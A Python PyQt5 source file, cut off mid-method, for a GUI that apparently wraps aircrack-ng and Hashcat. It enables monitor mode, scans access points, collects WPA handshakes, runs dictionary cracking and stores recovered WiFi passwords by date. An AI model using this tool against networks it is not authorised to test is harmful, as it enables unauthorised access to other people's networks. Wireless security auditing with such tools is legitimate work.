#!/usr/bin/env python3
import sys
import os
import datetime
import io
import threading
import re
import time
import shutil
import subprocess
import csv as csvmod
from pathlib import Path
from typing import Optional
from PyQt5.QtWidgets import QApplication, QMessageBox, QTableWidgetItem, QFileDialog, QInputDialog, QTreeWidgetItem
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, Qt
from PyQt5.QtGui import QFont, QColor

from ui.main_ui import MainUI, WordListDialog, CrackSettingsDialog, CrackResultWidget
from core.aircore import AirCore, today_str

# 停不掉的 QThread 保活集合: 丢弃引用会触发 abort, 见 _stop_threads
_KEEP_ALIVE = set()


class CmdThread(QThread):
    line_out = pyqtSignal(str)
    done = pyqtSignal()
    exited = pyqtSignal(int)

    def __init__(self, proc):
        super().__init__()
        self.proc = proc
        self._stop = False
        self.returncode = -1

    def run(self):
        try:
            if not self.proc or not self.proc.stdout:
                return
            for line in self.proc.stdout:
                if self._stop:
                    break
                self.line_out.emit(line.rstrip())
            self.proc.wait()
            self.returncode = self.proc.returncode
        except (OSError, ValueError) as e:
            print(f"[CmdThread] {e}")
        finally:
            self.exited.emit(self.returncode)
            self.done.emit()

    def stop(self):
        self._stop = True
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=2)
            except (OSError, subprocess.TimeoutExpired, ValueError):
                pass


class FuncThread(QThread):
    done = pyqtSignal(object)

    def __init__(self, fn):
        super().__init__()
        self._fn = fn

    def run(self):
        try:
            self.done.emit(self._fn())
        except Exception as e:  # noqa: BLE001 - 线程边界必须兜底
            print(f"[FuncThread] {e}")
            self.done.emit(None)


class EasyAirApp(MainUI):
    def __init__(self):
        super().__init__()
        # 打包后必须用稳定目录, 否则配置/历史会随临时目录一起消失
        self.core = AirCore()
        self.scan_thread = None
        self.cap_thread = None
        self.crack_thread = None
        self.conv_thread = None
        self.mon_thread = None
        self.mon_iface = None
        self.physical_iface = None
        self._last_csv = None
        self.auto_monitor_enabled = self.core.config.get("auto_monitor", True)
        self.scan_auto_stop = int(self.core.config.get("scan_auto_stop", 0) or 0)

        self.scan_timer = QTimer(self)
        self.scan_timer.timeout.connect(self._parse_scan_csv)
        self.scan_timer.setInterval(1500)
        # 倒计时/时长用独立的高频定时器: 解析 CSV 可能因文件被写占用
        # 而变慢甚至卡住, 倒计时不能跟着一起停(看起来就是"倒计时不连续")
        self.tick_timer = QTimer(self)
        self.tick_timer.timeout.connect(self._tick_scan_clock)
        self.tick_timer.setInterval(200)
        # 未扫描时必须为 0: 之前用 time.time() 会让"扫描时长"显示成
        # 几万小时, 且 -1 未知信号判断等判断全部失效
        self.scan_start_time = 0.0
        self.scan_deadline = None
        self._cd_anchor_left = 0
        self._last_clock_text = ""
        self._stopping_scan = False
        self._crack_running = False
        self._scan_warned = False
        self.scan_returncode = None

        # 破解相关状态
        self.current_crack_item = None
        self.current_crack_date = today_str()
        self.crack_start_time = 0
        self.crack_timer = QTimer(self)
        self.crack_timer.timeout.connect(self._update_crack_timer)
        self.crack_timer.setInterval(1000)
        self._worker = None
        self._workers = set()
        self._threads = set()
        self._last_persist = 0.0

        self._bind()
        self._load_wordlists()
        self._refresh_ifaces()
        self._refresh_engine_label()
        self._load_history_tabs()
        self._refresh_cap_tree()

    def closeEvent(self, event):
        """退出必须快速返回。

        原来这里同步跑 stop_monitor(含 sudo 校验, 最长 10s) 并逐个
        wait(2000) 等线程, 会让窗口长时间"未响应"甚至被强杀。
        现在: 先停子进程(有界等待), 监听接口交给后台线程收尾,
        残留的 mon 接口下次启动时 _cleanup_monitor 会清理。"""
        self.tick_timer.stop()
        self.scan_timer.stop()
        try:
            self._persist_record()
        except Exception as e:  # noqa: BLE001
            print(f"[退出] 保存进度失败: {e}")

        mon = self.mon_iface
        self.mon_iface = None
        self._stop_threads()

        if mon:
            def _cleanup(m=mon):
                try:
                    self.core.stop_monitor(m)
                except Exception as e:  # noqa: BLE001
                    print(f"[退出] 关闭监听失败: {e}")

            t = threading.Thread(target=_cleanup, daemon=True)
            t.start()
            _KEEP_ALIVE.add(t)

        super().closeEvent(event)

    def _bind(self):
        # 网卡
        self.btn_refresh_iface.clicked.connect(self._refresh_ifaces)

        # 监听模式按钮（手动切换）
        self.btn_mon_toggle.toggled.connect(self._on_mon_toggle)

        # 扫描/抓包
        self.btn_scan.clicked.connect(self._toggle_scan)
        self.btn_capture.clicked.connect(self._start_capture)

        # 字典管理
        self.btn_dict_mgr.clicked.connect(self._open_dict_manager)

        # 破解设置
        self.btn_crack_cfg.clicked.connect(self._open_crack_settings)
        self.btn_change_engine.clicked.connect(self._open_crack_settings)

        # 破解控制
        self.btn_start_crack.clicked.connect(self._toggle_crack)
        self.btn_batch_add.clicked.connect(self._batch_add_to_crack)
        self.btn_copy_wifi.clicked.connect(self._copy_wifi_credentials)
        self.cap_tree.customContextMenuRequested.connect(self._cap_menu)
        self.cap_tree.itemChanged.connect(self._on_cap_note_edited)
        self.btn_export.clicked.connect(self._export_results)
        self.btn_note.clicked.connect(self._edit_note)
        self.btn_del_record.clicked.connect(self._delete_record)
        self.log_tabs.currentChanged.connect(lambda _i: None)

        # AP 表格双击选择目标
        self.ap_table.cellClicked.connect(self._on_ap_clicked)

        # 握手包库双击载入
        self.cap_tree.itemDoubleClicked.connect(self._on_cap_double_clicked)
        self.cap_tree.itemSelectionChanged.connect(self._on_cap_selected)

    # ===== 线程管理 =====
    # 所有 QThread 必须由 self._threads 持有引用:
    # 一旦 C++ QThread 在运行中被析构, PyQt 会直接 abort 整个进程
    # ("QThread: Destroyed while thread is still running")
    def _track(self, thread):
        self._threads.add(thread)
        thread.finished.connect(lambda t=thread: self._threads.discard(t))
        return thread

    def _run_worker(self, fn, on_done=None):
        """在后台线程执行阻塞函数。

        不要在此等待上一个 worker: 抓握手包期间用户仍要点 Deauth,
        并发是正常用法; 而 GUI 线程 wait() 会造成最多 5s 的界面假死。
        这里只保留引用防止 QThread 被过早回收(那会触发
        "QThread: Destroyed while thread is still running")。"""
        worker = FuncThread(fn)
        if on_done is not None:
            worker.done.connect(on_done)
        self._worker = worker
        self._workers.add(worker)
        worker.finished.connect(lambda w=worker: self._workers.discard(w))
        self._track(worker)
        worker.start()
        return worker

    def _spawn_cmd(self, proc, on_line=None, on_done=None):
        """为子进程创建输出读取线程, 返回线程对象(不存局部变量!)"""
        t = CmdThread(proc)
        if on_line is not None:
            t.line_out.connect(on_line)
        if on_done is not None:
            t.done.connect(on_done)
        self._track(t)
        t.start()
        return t

    def _stop_threads(self):
        """终止子进程与工作线程。

        注意: 不能在线程仍在运行时丢弃引用 —— QThread 一旦被 GC 就会
        触发 "QThread: Destroyed while thread is still running" 并 abort
        整个进程(表现为界面被强制结束)。停不掉的线程交给模块级集合
        保活到进程退出。"""
        for t in list(self._threads):
            if isinstance(t, CmdThread):
                t.stop()
        for t in list(self._threads):
            try:
                if t.isRunning() and not t.wait(700):
                    _KEEP_ALIVE.add(t)
            except RuntimeError:
                _KEEP_ALIVE.add(t)
        self._threads.clear()
        for w in list(self._workers):
            try:
                if w.isRunning() and not w.wait(700):
                    _KEEP_ALIVE.add(w)
            except RuntimeError:
                _KEEP_ALIVE.add(w)
        self._workers.clear()

    # ===== 日志 =====
    # 扫描多久还没有 AP 就主动诊断(airodump-ng 抓到 0 个 AP 时不会退出)
    _NO_APS_TIMEOUT = 15

    # 真实报错关键词: 命中即绕过噪音过滤, 保证用户能看到失败原因
    _ERROR_KEYWORDS = (
        "not found", "no such file", "permission denied",
        "operation not permitted", "cannot ", "can't ", "failed",
        "error", "unable", "请以 root", "must be root", "denied",
        "unsupported", "not supported", "no devices found",
    )

    # 原始工具输出过滤规则: iw/airmon-ng 的表格、"command failed" 噪音
    _NOISE_PATTERNS = (
        "command failed", "command time out", "no such device",
        "\tInterface\tDriver", "PHY\tInterface", "Chipset",
        "(monitor mode disabled)", "(monitor mode enabled)",
        "nl80211: ", "--- ", "wlan0mon", "set monitor mode",
        "monitor mode for interface", "level 2", "level 3",
    )

    def _should_log(self, txt: str) -> bool:
        """过滤 iw/airmon-ng 原始输出, 但真实报错必须放行。
        顺序: 先按已知噪音表丢弃(这些是 iw 的固定输出, 如
        'command failed: No such device'), 未命中噪音表的报错行
        (如 'permission denied' / 'not found')一律保留。"""
        s = txt.strip()
        if not s:
            return False
        low = s.lower()
        for pat in self._NOISE_PATTERNS:
            if pat.lower() in low:
                return False
        for key in self._ERROR_KEYWORDS:
            if key in low:
                return True
        # 纯表格行(连续制表符)
        if s.count("\t") >= 2:
            return False
        return True

    def log(self, txt: str):
        """抓包/扫描日志 (只收有意义的内容)"""
        if not self._should_log(txt):
            return
        self.log_scan_box.appendPlainText(txt)

    def log_scan(self, txt: str):
        """子进程 stdout 入口 (airdump 等), 过滤噪音但保留扫描输出"""
        if self._should_log(txt):
            self.log_scan_box.appendPlainText(txt)

    def log_crack(self, txt: str):
        """破解日志"""
        self.log_crack_box.appendPlainText(txt)

    def set_status(self, txt: str):
        self.status_label.setText(txt)

    # ===== 网卡 =====
    def _refresh_ifaces(self):
        self.iface_combo.clear()
        for i in self.core.list_interfaces():
            self.iface_combo.addItem(i)
        if self.iface_combo.count() == 0:
            self.log("[提示] 未检测到无线网卡 (iw dev 无输出)")
            self.log("  - 真机: 确认网卡驱动正常")
            self.log("  - 虚拟机: 需将支持监听的 USB 无线网卡直通")

    # ===== 监听模式手动切换 =====
    def _enable_monitor(self) -> bool:
        """同步开启监听模式, 供"选中目标即抓包"这类流程内部调用。

        走工作线程执行 start_monitor, 完成后直接在当前线程继续,
        因此最多等待一次(界面在此期间不刷新)。返回是否成功开启。"""
        physical = self.iface_combo.currentText().strip()
        if not physical:
            self.set_status("请先在顶部选择无线网卡")
            return False
        if self.mon_iface:
            return True

        self.set_monitor_status("starting")
        self.physical_iface = physical
        btn = self.btn_mon_toggle
        was_checked = btn.isChecked()
        btn.setChecked(True)          # 触发 _on_mon_toggle
        btn.setChecked(was_checked)   # 还原: 开关已被禁用, 不代表用户意图
        btn.setEnabled(False)

        proc = None
        try:
            proc = self.core.start_monitor(physical)
        except Exception as e:  # noqa: BLE001
            print(f"[监听开启异常] {e}")
        if not proc:
            self.set_monitor_status("error")
            btn.setEnabled(True)
            self.set_status("监听模式开启失败")
            return False

        mon = self._detect_mon_iface(physical)
        if not mon:
            # 轮询等待接口出现
            for _ in range(10):
                if proc.poll() is not None:
                    break
                time.sleep(0.3)
                mon = self._detect_mon_iface(physical)
                if mon:
                    break
        if not mon:
            proc.terminate()
            self.set_monitor_status("error")
            btn.setEnabled(True)
            self.set_status("监听模式开启失败")
            return False

        self.mon_iface = mon
        self._monitor_proc = proc
        self.set_monitor_status("on")
        btn.setEnabled(False)
        self.log(f"[监听] 已开启: {physical} → {mon}")
        return True

    def _on_mon_toggle(self, checked: bool):
        physical = self.iface_combo.currentText()
        if not physical:
            self.btn_mon_toggle.setChecked(False)
            return

        if checked:
            self.set_monitor_status("starting")
            self.physical_iface = physical
            self.btn_mon_toggle.setEnabled(False)
            self.set_status(f"正在开启监听模式 · {physical}")
            self._run_worker(lambda: self.core.start_monitor(physical),
                             self._on_mon_started)
        else:
            self._stop_monitor_manual()

    def _detect_mon_iface(self, physical: str) -> str:
        """阻塞式检测实际监听接口名（供工作线程调用）"""
        if self.core.check_monitor_mode(physical):
            return physical
        for iface in self.core.list_interfaces():
            if "mon" in iface and physical in iface:
                if self.core.check_monitor_mode(iface):
                    return iface
        return ""

    def _on_mon_started(self, _proc):
        """airmon-ng 已启动，检测实际监听接口（检测也要放线程）"""
        self.btn_mon_toggle.setEnabled(True)
        physical = self.physical_iface
        self._run_worker(lambda: self._detect_mon_iface(physical),
                         self._apply_mon_iface)

    def _apply_mon_iface(self, mon):
        if mon:
            self.mon_iface = mon
            self.log(f"监听模式已就绪 · 接口 {mon}")
            self.set_monitor_status("on")
            self.set_status(f"监听中 · 可直接扫描或抓取握手包")
            return

        self.log("监听模式开启失败 · 未检测到 monitor 接口")
        self.set_monitor_status("error")
        self.btn_mon_toggle.setChecked(False)
        self.set_status("监听模式开启失败")

    def _stop_monitor_manual(self):
        if self.mon_iface:
            mon = self.mon_iface
            self.set_monitor_status("starting")
            self.set_status("正在关闭监听模式…")
            self._run_worker(lambda: self.core.stop_monitor(mon),
                             self._on_stop_monitor_proc)

    def _on_stop_monitor_proc(self, p):
        self._spawn_cmd(p, self.log_scan, self._on_mon_stopped)

    def _on_mon_stopped(self):
        self.mon_iface = None
        self.physical_iface = None
        self.set_monitor_status("off")
        self.btn_mon_toggle.setChecked(False)
        self.log("监听模式已关闭")
        self.set_status("监听模式已关闭")

    # ===== 字典管理 =====
    def _load_wordlists(self):
        pass  # 不在主界面显示

    def _open_dict_manager(self):
        dlg = WordListDialog(self, self.core.get_wordlists())
        if dlg.exec_() == WordListDialog.Accepted:
            new_lists = dlg.get_wordlists()
            self.core.config["wordlists"] = new_lists
            self.core.save_config()
            self.log(f"[字典] 已更新，共 {len(new_lists)} 个字典文件")

    def _open_crack_settings(self):
        dlg = CrackSettingsDialog(self, self.core.config)
        if dlg.exec_() != CrackSettingsDialog.Accepted:
            return
        vals = dlg.values()
        self.core.config.update(vals)
        self.core.save_config()
        self.auto_monitor_enabled = vals["auto_monitor"]
        self.scan_auto_stop = vals["scan_auto_stop"]
        self._refresh_engine_label()
        self.log(f"[设置] 引擎={vals['crack_engine']} | 设备={vals['crack_device']}")
        self.log(f"[设置] GPU 温度上限={vals['hashcat_temp_limit'] or '不限制'}")
        self.log(f"[设置] 扫描自动停止="
                 f"{self.scan_auto_stop}s" if self.scan_auto_stop else "[设置] 扫描需手动停止")
        self.set_status("设置已保存")

    def _refresh_engine_label(self):
        engine = self.core.config.get("crack_engine", "Hashcat (GPU/CPU)")
        device = self.core.config.get("crack_device", "GPU + CPU (自动)")
        self.lbl_engine.setText(f"{engine}  |  {device}")

    # ===== 破解结果: 按日期归类 =====
    def _load_history_tabs(self):
        self.result_tabs.blockSignals(True)
        while self.result_tabs.count():
            page = self.result_tabs.widget(0)
            self.result_tabs.removeTab(0)
            page.deleteLater()

        history = self.core.load_history()
        dates = sorted(history.keys(), reverse=True)
        if today_str() not in dates:
            dates.insert(0, today_str())

        for date in dates:
            tree = CrackResultWidget()
            for rec in history.get(date, []):
                tree.load_record(rec)
            n = tree.topLevelItemCount()
            self.result_tabs.addTab(tree, f"{date} ({n})")
            tree.itemSelectionChanged.connect(
                lambda _t=date: self._sync_record_buttons(_t))
        self.result_tabs.blockSignals(False)
        self.current_crack_date = self._tab_date(0) or today_str()

    def _tab_date(self, index=None) -> str:
        idx = self.result_tabs.currentIndex() if index is None else index
        if idx < 0:
            return today_str()
        label = self.result_tabs.tabText(idx)
        return label.split(" (")[0]

    def _current_result_tree(self):
        return self.result_tabs.currentWidget()

    def _cap_menu(self, pos):
        """握手包库右键菜单: 删除 / 清空。"""
        item = self.cap_tree.itemAt(pos)
        menu = QMenu(self)
        act_del = menu.addAction("🗑 删除选中")
        act_clear = menu.addAction("🧹 清空全部")
        act_note = menu.addAction("📝 编辑备注")
        chosen = menu.exec_(self.cap_tree.viewport().mapToGlobal(pos))
        if chosen is None:
            return
        if chosen == act_note:
            if item:
                self.cap_tree.editItem(item, 0)
            return
        if chosen == act_del:
            self._delete_selected_caps()
            return
        if chosen == act_clear:
            self._clear_all_caps()

    def _selected_caps(self) -> list:
        out = []
        for it in self.cap_tree.selectedItems():
            v = it.data(0, Qt.UserRole)
            if v:
                out.append(Path(v))
        return out

    def _delete_selected_caps(self):
        caps = self._selected_caps()
        if not caps:
            self.set_status("请先在握手包库中选择要删除的文件")
            return
        if QMessageBox.question(
                self, "删除确认",
                f"确定删除选中的 {len(caps)} 个握手包?\\n删除后无法恢复。",
                QMessageBox.Yes | QMessageBox.No) != QMessageBox.Yes:
            return
        n = 0
        for c in caps:
            try:
                c.unlink(missing_ok=True)
                Path(str(c) + ".note").unlink(missing_ok=True)
                n += 1
            except OSError as e:
                self.log(f"[删除失败] {c.name}: {e}")
        self._refresh_cap_tree()
        self.set_status(f"已删除 {n} 个握手包")

    def _clear_all_caps(self):
        caps = [p for _, p, _ in self.core.list_handshakes()]
        if not caps:
            self.set_status("握手包库已是空的")
            return
        if QMessageBox.question(
                self, "清空确认",
                f"确定清空全部 {len(caps)} 个握手包?\\n删除后无法恢复。",
                QMessageBox.Yes | QMessageBox.No) != QMessageBox.Yes:
            return
        n = 0
        for c in caps:
            try:
                c.unlink(missing_ok=True)
                Path(str(c) + ".note").unlink(missing_ok=True)
                n += 1
            except OSError as e:
                self.log(f"[删除失败] {c.name}: {e}")
        for sub in self.core.caps_dir.glob("20??-??-??"):
            try:
                sub.rmdir()      # 只删空目录
            except OSError:
                pass
        self._refresh_cap_tree()
        self.set_status(f"已清空 {n} 个握手包")

    def _batch_add_to_crack(self):
        """把握手包库中选中的多个握手包批量加入右侧列表。"""
        caps = self._selected_caps()
        if not caps:
            QMessageBox.information(
                self, "提示",
                "请先在下方「握手包库」中按住 Ctrl 或 Shift 多选要破解的握手包")
            return
        tree = self._current_result_tree()
        added = 0
        for cap in caps:
            note = self.core.cap_note(cap)
            tree.add_target(cap.stem, "", str(cap), note)
            added += 1
        idx = self.result_tabs.currentIndex()
        if idx >= 0:
            self.result_tabs.setTabText(
                idx, f"{self._tab_date(idx)} ({tree.topLevelItemCount()})")
        self._persist_record()
        self.set_status(f"已批量加入 {added} 个握手包到右侧列表")
        self.log(f"[批量] 已加入 {added} 个握手包")

    def _copy_wifi_credentials(self):
        """复制选中记录的 WiFi 名称与密码, 无密码时不可用。"""
        tree = self._current_result_tree()
        item = tree.current_record() if tree else None
        if not item:
            return
        pwd = item.text(CrackResultWidget.COL_PWD)
        essid = item.text(CrackResultWidget.COL_ESSID) or ""
        if not pwd or pwd == "破解中...":
            self.set_status("该记录尚未破解出密码")
            return
        text = f"WIFI:S:{essid};T:WPA;P:{pwd};;"
        QApplication.clipboard().setText(text)
        self.set_status(f"已复制: {essid}")
        self.log(f"[复制] {text}")

    def _sync_record_buttons(self, _date=None):
        tree = self._current_result_tree()
        item = tree.current_record() if tree else None
        has = bool(item)
        self.btn_note.setEnabled(has)
        self.btn_del_record.setEnabled(has)
        # 只有真的破解出密码才允许复制, 否则置灰
        pwd = item.text(CrackResultWidget.COL_PWD) if has else ""
        self.btn_copy_wifi.setEnabled(
            bool(pwd) and pwd != "破解中..." and pwd != "未找到")

    def _reload_current_tab(self):
        date = self._tab_date()
        tree = self._current_result_tree()
        if not tree:
            return
        tree.clear()
        for rec in self.core.history_records(date):
            tree.load_record(rec)
        self.result_tabs.setTabText(
            self.result_tabs.currentIndex(),
            f"{date} ({tree.topLevelItemCount()})")

    def _edit_note(self):
        tree = self._current_result_tree()
        item = tree.current_record() if tree else None
        if not item:
            QMessageBox.information(self, "提示", "请先在结果列表中选择一条记录")
            return
        cur = item.text(CrackResultWidget.COL_NOTE)
        note, ok = QInputDialog.getText(self, "添加备注", "备注 (如破解地点):", text=cur)
        if not ok:
            return
        tree.set_note(item, note.strip())
        date = self._tab_date()
        index = tree.indexOfTopLevelItem(item)
        rec = tree.to_record(item)
        self.core.history_update(date, index, rec)
        self.log(f"[备注] {rec['essid'] or rec['bssid']} -> {rec['note'] or '(空)'}")

    def _delete_record(self):
        tree = self._current_result_tree()
        item = tree.current_record() if tree else None
        if not item:
            return
        rec = tree.to_record(item)
        if QMessageBox.question(
            self, "确认删除",
            f"删除记录?\n\nSSID: {rec['essid']}\nBSSID: {rec['bssid']}\n备注: {rec['note'] or '-'}"
        ) != QMessageBox.Yes:
            return
        self._remove_record(self._tab_date(), tree.indexOfTopLevelItem(item),
                            f"{rec['essid'] or rec['bssid']}")

    def _remove_record(self, date: str, index: int, label: str = ""):
        """删除一条历史并同步 tab(空日期的非今日 tab 直接移除)"""
        if not self.core.history_delete(date, index):
            return False
        if not self.core.history_records(date) and date != today_str():
            page = self._current_result_tree()
            self.result_tabs.removeTab(self.result_tabs.currentIndex())
            if page:
                page.deleteLater()
        else:
            self._reload_current_tab()
        self.log(f"[删除] 已删除 {label} ({date})")
        return True

    # ===== 握手包库 =====
    def _refresh_cap_tree(self):
        self.cap_tree.clear()
        groups = {}
        for day, path, size in self.core.list_handshakes():
            groups.setdefault(day, []).append((path, size))
        for day in sorted(groups.keys(), reverse=True):
            caps = groups[day]
            top = QTreeWidgetItem([f"📅 {day}  ({len(caps)} 个)", ""])
            font = top.font(0)
            font.setBold(True)
            top.setFont(0, font)
            top.setForeground(0, QColor("#1565c0"))
            top.setData(0, Qt.UserRole, day)   # 日期分组标记
            # 每个子项: 文件名 + 导入日期时间 + 可编辑备注
            for path, size in sorted(caps, key=lambda x: x[0].name, reverse=True):
                mtime = datetime.datetime.fromtimestamp(path.stat().st_mtime)
                child = QTreeWidgetItem([
                    f"{path.name}    {mtime:%Y-%m-%d %H:%M:%S}",
                    f"{size / 1024:.1f} KB"])
                child.setData(0, Qt.UserRole, str(path))
                child.setData(1, Qt.UserRole, self.core.cap_note(path))
                self._apply_cap_note(child, self.core.cap_note(path))
                child.setToolTip(0, str(path))
                top.addChild(child)
            self.cap_tree.addTopLevelItem(top)
        self.cap_tree.expandAll()

    def _apply_cap_note(self, item, note: str):
        """把备注显示在导入时间后面, 并允许直接编辑。"""
        base = item.text(0)
        if "  ·  " in base:
            base = base.split("  ·  ")[0]
        item.setText(0, f"{base}  ·  {note}" if note else base)
        item.setFlags(item.flags() | Qt.ItemIsEditable)

    def _on_cap_note_edited(self, item, column):
        if column != 0:
            return
        path = item.data(0, Qt.UserRole)
        if not path:
            return
        text = item.text(0)
        note = text.split("  ·  ")[1].strip() if "  ·  " in text else ""
        self.core.set_cap_note(Path(path), note)
        self._apply_cap_note(item, note)

    def _on_cap_selected(self):
        self._sync_record_buttons()

    def _on_cap_double_clicked(self, item, _col):
        cap = item.data(0, Qt.UserRole)
        if not cap:
            self.cap_tree.collapseItem(item)
            return
        self.lbl_handshake.setText(Path(cap).name)
        self.lbl_handshake.setStyleSheet("color: #2e7d32; font-weight: bold;")
        self.log(f"[载入] 握手包: {cap}")
        self.set_status(f"已载入握手包 {Path(cap).name} - 可开始破解")

    # ===== 扫描 AP（自动开启监听）=====
    def _preflight_scan(self) -> bool:
        """开扫前自检, 避免启动后一直停在'等待 AP'却不知原因。
        注意 airodump-ng 由 core 内部用 sudo/pkexec 提权运行,
        所以不要求 GUI 本身是 root, 只要求有提权手段。"""
        problems = []
        if not shutil.which("airodump-ng"):
            problems.append("未安装 airodump-ng（sudo apt install aircrack-ng）")
        if not self.core.can_elevate():
            problems.append("无法取得 root 权限（无密码文件且未安装 pkexec）")
        if problems:
            for p in problems:
                self.log(f"[自检] {p}")
            self.set_status("扫描前置检查未通过")
            return False
        return True

    def _start_scan(self):
        physical = self.iface_combo.currentText()
        if not physical:
            self.set_status("请先在顶部选择无线网卡")
            return

        if not self._preflight_scan():
            return

        # 监听模式已就绪则直接扫, 不必重启监听(重启会打断已有会话)
        if self.mon_iface and self.core.check_monitor_mode(self.mon_iface):
            self.set_status("正在启动 airodump-ng…")
            self._do_scan()
            return

        self.set_status("正在开启监听模式…")
        self.set_monitor_status("starting")

        self.physical_iface = physical
        self.btn_scan.setEnabled(False)
        self.btn_scan.setText("⏳ 开启监听中…")

        self._run_worker(lambda: self.core.start_monitor(physical),
                         self._on_mon_ready_for_scan)

    def _on_mon_ready_for_scan(self):
        """监听模式就绪，开始扫描"""
        physical = self.physical_iface

        def _detect():
            return self._detect_mon_iface(physical)

        self._run_worker(_detect, self._apply_mon_then_scan)

    def _apply_mon_then_scan(self, mon):
        if mon:
            self.mon_iface = mon
            self.log(f"监听模式已就绪 · 接口 {mon}")
            self.set_monitor_status("on")
            self._do_scan()
            return

        self.log("监听模式开启失败 · 未检测到 monitor 接口")
        self.log("  · 该网卡驱动可能不支持监听模式")
        self.log("  · 虚拟机需直通支持监听的 USB 无线网卡")
        self.set_monitor_status("error")
        self.btn_scan.setEnabled(True)
        self.btn_scan.setText("🔍 扫描")
        self.set_status("监听模式开启失败 · 无法扫描")

    def _do_scan(self):
        """实际开始 airodump-ng 扫描"""
        self.log(f"> 扫描 AP: {self.mon_iface}")
        self.btn_scan.setText("⏹ 扫描中")
        self.scan_start_time = time.time()
        self._scan_warned = False
        self.scan_deadline = (time.time() + self.scan_auto_stop
                               if self.scan_auto_stop > 0 else None)
        self._autostop_firing = False
        self._cd_anchor_left = int(self.scan_auto_stop)
        self._last_clock_text = ""
        self.tick_timer.start()
        self.scan_elapsed.setText(self._scan_elapsed_text())
        if self.scan_deadline:
            self.log(f"[扫描] 将在 {self.scan_auto_stop} 秒后自动停止")
        else:
            self.log("[扫描] 不会自动停止，请点'停止扫描'")
        self._run_worker(lambda: self.core.airodump_scan(self.mon_iface, "scan"),
                         self._on_scan_started)
        self.scan_elapsed.setText(self._scan_elapsed_text())
        self.scan_timer.start()
        self.set_scan_status("scanning")

    def _on_scan_started(self, proc):
        if not proc:
            self.log("[错误] airodump-ng 启动失败")
            self._scan_failed("airodump-ng 无法启动 · 请检查是否已安装")
            return
        t = self._spawn_cmd(proc, self.log_scan, self._on_scan_exited)
        if hasattr(t, "exited"):
            t.exited.connect(self._on_scan_exit_code)
        self.set_status("正在搜索周边 AP…")

    def _on_scan_exited(self):
        """airodump-ng 进程结束。若一个 AP 都没有, 说明是启动失败而非环境安静。"""
        if not self.scan_timer.isActive():
            return  # 用户主动停止
        if self.ap_table.rowCount() > 0:
            return
        self._scan_failed("airodump-ng 已退出但未捕获到任何 AP")

    def _on_scan_exit_code(self, rc: int):
        self.scan_returncode = rc

    def _scan_failed(self, reason: str):
        """扫描失败: 说明原因并恢复界面, 不要再停在'等待 AP'"""
        self.log(f"[错误] {reason}")
        self._stop_scan()          # 先恢复界面, 它会覆写 status
        hints = []
        if not shutil.which("airodump-ng"):
            hints.append("未找到 airodump-ng，请先安装 aircrack-ng 套件")
        if not self.mon_iface:
            hints.append("监听接口为空，请先开启监听模式")
        hints.append("确认以 root 运行，且网卡驱动支持监听模式")
        for h in hints:
            self.log(f"  · {h}")
        self.set_status(f"扫描失败 · {reason}")

    def _warn_no_aps(self):
        """扫描进行中但一直没有 AP。实测网卡接口状态给出可执行结论。"""
        waited = int(time.time() - self.scan_start_time)
        iface = self.mon_iface or "(空)"
        self.log(f"[警告] 已扫描 {waited}s 仍未捕获到任何 AP")
        self.set_status(f"已等待 {waited}s，仍未捕获 AP")

        def _probe():
            return {
                "iface": iface,
                "monitor": self.core.check_monitor_mode(iface) if self.mon_iface else False,
                "ifaces": self.core.list_interfaces(),
                "root": os.geteuid() == 0,
                "elevate": self.core.can_elevate(),
                "airodump": shutil.which("airodump-ng") or "",
            }

        self.set_status("正在检测监听状态…")
        self._run_worker(_probe, self._apply_no_aps_diag)

    def _apply_no_aps_diag(self, d):
        if not d:
            self.log("  · 状态检测失败，请手动执行 airodump-ng 验证")
            self.set_status("仍未捕获 AP，请查看日志建议")
            return

        if not d["airodump"]:
            self.log("  · 未找到 airodump-ng，请安装 aircrack-ng 套件")
        if not self.mon_iface:
            self.log("  · 监听接口为空，监听模式可能未开启成功")
        elif not d["monitor"]:
            self.log(f"  · 接口 {d['iface']} 不在 monitor 模式（网卡驱动可能不支持）")
        if not d["root"] and not d["elevate"]:
            self.log("  · 无 root 提权手段，airodump-ng 可能抓不到数据")
        self.log(f"  · 当前可用无线接口: {', '.join(d['ifaces']) or '无'}")
        self.log("  · 建议: 靠近 2.4GHz 热点后重试，或点顶部 ● 关闭再开启监听模式")
        self.set_status("仍未捕获 AP，请查看日志建议")

    def _scan_elapsed_text(self):
        if not self.scan_start_time:
            return ""
        base = f"扫描时长: {self._format_elapsed(self.scan_start_time)}"
        if self.scan_deadline:
            left = self.scan_deadline - time.time()
            if left <= 1:
                base += " | 1s 后自动停止"
            else:
                # 严格 1 秒 1 跳: 以首次取整为锚点, 每跨过一个整数边界
                # 才减 1。之前每次都按当前剩余时间取整, 锚点会随 tick 漂移,
                # 出现 3->2->3 这种来回跳。
                base += f" | {self._countdown_num()}s 后自动停止"
        return base

    def _stop_scan(self):
        if self._stopping_scan:
            return
        self._stopping_scan = True
        try:
            if self.scan_thread:
                self.scan_thread.stop()
                self.scan_thread = None
            self.scan_timer.stop()
            self.tick_timer.stop()
            self.scan_deadline = None
            self.scan_start_time = 0.0
            self._cd_anchor_left = 0
            self._last_clock_text = ""
            self.scan_elapsed.setText("")
            self._parse_scan_csv(force=True)
            self.btn_scan.setEnabled(True)
            self.btn_scan.setEnabled(True)
            self.btn_scan.setText("🔍 扫描")
            self.set_scan_status("idle")
            n = self.ap_table.rowCount()
            self.set_status(f"扫描已停止 - 共发现 {n} 个 AP")
            if self.mon_iface:
                self.log(f"监听模式保持开启 · {self.mon_iface} · 可直接抓取握手包")
            else:
                self.log("[提示] 监听模式未开启，请点顶部按钮开启后再抓包")
        finally:
            self._stopping_scan = False

    def _find_latest_csv(self):
        csvs = [c for c in self.core.caps_dir.glob("scan*.csv") if c.is_file()]
        return max(csvs, key=lambda x: x.stat().st_mtime) if csvs else None

    def _parse_scan_csv(self, force=False):
        # 倒计时/自动停止与"是否发现新 AP"无关, 每次 tick 都要处理
        if self.scan_timer.isActive():
            self.scan_elapsed.setText(self._scan_elapsed_text())
            if self.scan_deadline and time.time() >= self.scan_deadline:
                self.log("[扫描] 达到设定时长，自动停止")
                self.scan_deadline = None
                self._stop_scan()
                return
            # 看门狗: airodump-ng 抓到 0 个 AP 时并不会退出, 所以进程存活
            # 不能代表成功。超时无 AP 必须主动提示, 否则界面永远停在"等待 AP"。
            if (self.ap_table.rowCount() == 0
                    and not self._scan_warned
                    and time.time() - self.scan_start_time >= self._NO_APS_TIMEOUT):
                self._scan_warned = True
